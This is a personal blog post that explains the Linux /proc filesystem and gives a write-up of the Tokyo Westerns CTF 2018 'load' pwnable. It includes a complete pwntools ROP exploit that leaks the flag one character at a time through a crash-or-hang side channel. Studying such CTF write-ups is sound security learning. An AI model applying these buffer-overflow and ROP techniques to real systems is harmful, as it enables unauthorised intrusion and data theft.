---
layout: post
title:  "WTH is procfs?"
date:   2019-07-04
categories: ctf
---
Today is the day that about an year has passed since I've started doing CTFs. Over the year, I participated in so many decent competitions. At first, these super-hard competitions were not so helpful to me, since the topics were too complex for a newbie to approach. However at some point I became capable of solving the most baby-ish challenges in CTFs. The first pwnable challenge I solved in a hard CTF was `load` in Tokyo Westerns CTF 2018. Despite the fact that it was a baby-ish challenge it had less than 50 solvers, I remember. Also, I learned a lot about the proc filesystem, an ingenious implementation. In this entry, I am going to post the write-up for `load` and what a proc filesystem is and why it is so useful in binary exploitation.

# What is a procfs
procfs, or the /proc filesystem is a pseudo-filesystem that stores information about processes and the os. You can locate procfs in the directory `/proc`. The exact structure of procfs differs amongst kernel versions but there is a general format.

First, each process has a subdirectory, whose name is equal to the PID. For example, if a process has pid 2000, its procfs will be located at `/proc/2000`. Also, the path `/proc/self` is a symbolic link to `/proc/<PID>`. This configuration is very useful because it implies that a process does not need to know its PID in order to access files in `/proc/<PID>`.

Also, there are entires directly below `/proc`, which are usually files directly related to the kernel. One of them is `/proc/cmdline`, which is the boot command line. Another is `/proc/cpuinfo`, which, as one can infer from the name is a file that holds information about the current CPU. A very important entry in `/proc` is the `/proc/kallsyms` file which has all the kernel symbols and its address. In old version kernels this file could be read by a non-root user. This was a very straightforward infoleak bug. Later, it was admitted as a security bug and patched so that if a non-root user reads this file it displays all the symbol addresses as NULL. Right now, if you execute `cat /proc/kallsyms` it will show lots of 0's.

Now, let's check out what is inside `/proc/<PID>`.

# procfs and pwnables
On the terminal, let's execute `ls /proc/self` and it will probably display something like this:

```
attr             exe        mounts         projid_map    status
autogroup        fd         mountstats     root          syscall
auxv             fdinfo     net            sched         task
cgroup           gid_map    ns             schedstat     timers
clear_refs       io         numa_maps      sessionid     timerslack_ns
cmdline          limits     oom_adj        setgroups     uid_map
comm             loginuid   oom_score      smaps         wchan
coredump_filter  map_files  oom_score_adj  smaps_rollup
cpuset           maps       pagemap        stack
cwd              mem        patch_state    stat
environ          mountinfo  personality    statm
```
The important stuffs are: `exe`, `environ`, `mem`, `maps`, and `fd`.

### exe
This is a symbolic link to the executable. For example, if you access `/proc/self/exe` in a python process it will probably point to `/usr/bin/python` or something similar.

### environ
This is a very interesting file. It stores the keys and values of environment variables, but what's interesting is that its contents change if the process change its environment variables via `setenv` or a stack buffer overflow. Note that this file is useful because it is one of those rare files whose content can be (paritally) controlled by the user and the path is known to the user at the same time.

### mem
This file is mapped to the process's virtual memory space. It is a sparse file, meaning that there are gaps between offsets. If you want to access a certain virtual memory offset, you can seek that virtual memory offset of that file and read or write to it.

### maps
A very important file. This shows all the memory mappings present in the process. It displays the virutal memory address range, permissions (rwx) and the file a certain memory region is mapped to, unless it is anonymous. If an attacker can read this file he/she can render ASLR useless. Also, this file can be used for effective debugging. `/proc/self/maps` is also used in glibc, to figure out the permissions of a certain memory address.

### fd
`fd` is a directory, and under this directory there are each files representing each file descriptor. Therefore unless under very special circumstances there must be the entry 0, 1, and 2 which represents stdin, stdout and stderr respectively. Each of these files are the symbolic links to the original file. For example, if a process opens the file "flag.txt" and the open system call returns the file descriptor 3, then `/proc/self/fd/3` will point to `flag.txt`. If a certain file descriptor is closed the entry for that descriptor will be removed.

# writeup for load

### Analysis
This binary takes in a 128 length filename and uses to `open()` and `read()` function to read contents from it. The length and offset can be controlled freely by the user, which causes a buffer overflow. To control the overflowed buffer content we read from `/dev/stdin`. (`/dev/stdin` is a symlink to `/proc/self/fd/0`) We can enter 0 for the offset and an sufficient length so the ROP chain will fit in. However, right before the binary terminates, the binary closes stdin, stdout and sterr using the `close()` system call. Therefore information disclosure or further input is impossible.

### First Option
We considered opening `/dev/stdin` again, but this did not work because obviously /dev/stdin is a symlink to `/proc/self/fd/0` which is already closed. In the local environment it was possible to open `/dev/pts/0`, `/dev/pts/1`, `/dev/pts/2` which correspond to stdin, stdout, stderr respectively. However in the remote server it did not work. Therefore instead of obtaining a shell or using an open-read-write chain, we thought of other options.

### Usable Gadgets
By using the magic gadget in libc_csu_init, we can gain rdi, rsi and rdx control. (Rdx control is a bit more complicated yet you can see how it is done in my solve.py)
Functions that can be used are open, read, strchr, start, atoi ..etc. Functions that print to the screen like `puts()` or `printf()` are useless since stdout is closed. Strchr returns a NULL when the char argument is not found within the string. Otherwise it returns a pointer within the string that matches the character. There is a gadget that dereferences rax, and when strchr fails to find a character this gadget will cause a segmentation fault for it will attempt to dereference the address 0.
We create the ROP chain that determines if flag[idx] == C.

```
1. open("flag.txt",0) = 0
2. repeat read(0,buf,1) for (idx+1) times. -> in buf, flag[idx] will be stored.
3. strchr(buf,C)
4. RAX dereferencing gadget
5. infinite loop ROP chain
```

If flag[idx] == C, **infinite loop ROP chain** will be exectued, which will hang the remote socket from closing. Otherwise it will cause a segmentation fault (due to the RAX dereferencing gadget, since RAX will become NULL after strchr(buf,C)) and the remote socket will close immediately. 

This is my exploit script:

```python
from pwn import*
import time
import string
def rdx_control(value):
	payload=p64(pop_rbx_rbp_r12_r13_r14_r15)
	payload+=p64(0)+p64(1)+p64(bss+len(prefix1)+len(prefix2))+p64(value)+p64(0)+p64(0)
	payload+=p64(0x400A50)
	payload+=p64(0)*7
	return payload
def infinite_loop():
	payload=p64(pop_rdi)+p64(bss+len(prefix1)+len(prefix2)+len(prefix3))
	payload+=p64(atoi)
	payload+=p64(jmp_rax)
	return payload
def makefile():
	payload=rdx_control(044)
	payload+=p64(pop_rdi)+p64(bss+len(prefix1)+len(prefix2)+len(prefix3))
	payload+=p64(pop_rsi_r15)+p64(192)+p64(0)
	payload+=p64(_open)
	return payload


pop_rbx_rbp_r12_r13_r14_r15=0x400A6A
bss=0x601040
base=0x400000
start=0x400720
main=0x400816
puts=0x4006C0
read=0x4006E8
verify_gadget=0x4007e7
pop_rdi=0x400a73
pop_rsi_r15=0x400a71
_open=0x400710
strchr=0x4006D0
MAX_LEN=1000
atoi=0x400718
jmp_rax=0x400775

prefix1,prefix2,prefix3,prefix4="","","",""

def check_char(idx,ch):
	global prefix1,prefix2,prefix3,prefix4
	p=remote("pwn1.chal.ctf.westerns.tokyo", 34835)
	prefix1,prefix2,prefix3,prefix4="/dev/stdin\x00","flag.txt\x00",p64(0x4009DA),str(jmp_rax)+"\x00"
	filename=prefix1+prefix2+prefix3+prefix4
	flag_addr=bss+len(prefix1)+len(prefix2)+len(prefix3)+len(prefix4)
	assert len(filename)<=0x38
	p.send(filename.ljust(128,"\x00"))
	sleep(0.01)
	p.sendline(str(0))
	sleep(0.01)

	#open flag to descriptor 0
	payload="A"*0x38
	payload+=p64(pop_rdi)+p64(bss+len(prefix1))
	payload+=p64(pop_rsi_r15)+p64(0)+p64(0)
	payload+=p64(_open)

	#rdx control: must be done before all else
	payload+=rdx_control(1)

	#read from flag
	for i in range(idx+1):
		payload+=p64(pop_rdi)+p64(0)
		payload+=p64(pop_rsi_r15)+p64(flag_addr)+p64(0)
		payload+=p64(read)

	#strchr flag
	payload+=p64(pop_rdi)+p64(flag_addr)
	payload+=p64(pop_rsi_r15)+p64(ord(ch))+p64(0)
	payload+=p64(strchr)

	#verify
	payload+=p64(verify_gadget)
	payload+=infinite_loop()
	MAX_LEN=len(payload)
	p.sendline(str(MAX_LEN))
	sleep(0.01)
	if len(payload)>MAX_LEN:
		print "[*] faulty payload"
		exit(0)

	p.send(payload.ljust(MAX_LEN,"\x00"))
	s=time.clock()
	p.recvall()
	e=time.clock()
	return e-s

if __name__ == "__main__":
	CHSET=[chr(x) for x in range(ord('a'),ord('z')+1)]
	CHSET+=[str(x) for x in range(10)]
	CHSET+=["_","{","}","!","@","#","$","%","^","&","*"]
	CHSET+=[chr(x) for x in range(ord('A'),ord('Z')+1)]
	
	idx=int(raw_input("enter index of flag to get: "))

	for i in CHSET:
		check_char(idx,i)
		print i

#TWCTF{pr0cf5_15_h1ghly_fl3x1bl3}
```

By using these chains I could obtain the flag letter by letter, and the flag was:

`TWCTF{procf5_15_h1ghly_fl3x1bl3}`

## Post-CTF
After the CTF by using a devfs trick you can re-open stdin and stdout, and solve the challenge like any regular ROP challenge. However, I felt that my solution was good enough, and I learned a lot from constructing the exploit. It was my first time solving a challenge in a decent CTF, so I felt very proud of myself at that time although looking back at it, it is a trivial accomplishment.